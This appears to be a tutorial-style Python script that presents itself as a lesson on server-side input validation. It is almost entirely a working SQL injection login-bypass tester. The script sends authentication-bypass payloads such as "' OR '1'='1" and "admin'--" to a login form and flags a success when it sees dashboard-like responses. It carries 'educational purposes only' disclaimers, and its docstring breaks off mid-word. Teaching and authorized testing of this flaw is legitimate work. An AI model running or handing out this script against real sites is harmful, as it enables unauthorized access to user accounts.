#!/usr/bin/env python3
"""
Server-Side Validation FAIL
===========================
Stop making this critical web security mistake! Many developers forget to validate user input on the SERVER side. Client-side validation is easily bypassed. Attackers can inject malicious SQL, JavaScr

⚠️  EDUCATIONAL PURPOSES ONLY — Get proper authorization before testing.
📺  Watch the video walkthrough on our Instagram!
📅  2026-03-02 16:57:43
"""

import requests
import sys

class SQLiTester:
    """Realistic SQL injection tester for educational purposes"""
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def test_login_bypass(self, username_field='username', password_field='password'):
        """Test for classic SQL injection in login forms"""
        
        # Common SQL injection payloads for authentication bypass
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "admin'--",
            "' OR 1=1--",
            "\" OR \"\"=\""
        ]
        
        print(f"[*] Testing {self.target_url} for SQL injection...")
        
        for payload in payloads:
            # Craft malicious login attempt
            data = {
                username_field: payload,
                password_field: payload
            }
            
            try:
                response = self.session.post(self.target_url, data=data, timeout=5)
                
                # Check for successful bypass indicators
                if response.status_code == 200:
                    if any(indicator in response.text.lower() for indicator in 
                          ['welcome', 'dashboard', 'logout', 'success']):
                        print(f"[!] POTENTIAL VULNERABILITY FOUND with payload: {payload}")
                        print(f"    Response length: {len(response.text)} chars")
                        return True
                        
            except Exception as e:
                print(f"[!] Error testing payload {payload}: {e}")
                
        print("[*] No obvious vulnerabilities found")
        return False

# Example usage (educational purposes only)
if __name__ == "__main__":
    # NEVER test on systems you don't own!
    test_url = "http://vulnerable-test-site.com/login"
    tester = SQLiTester(test_url)
    tester.test_login_bypass()
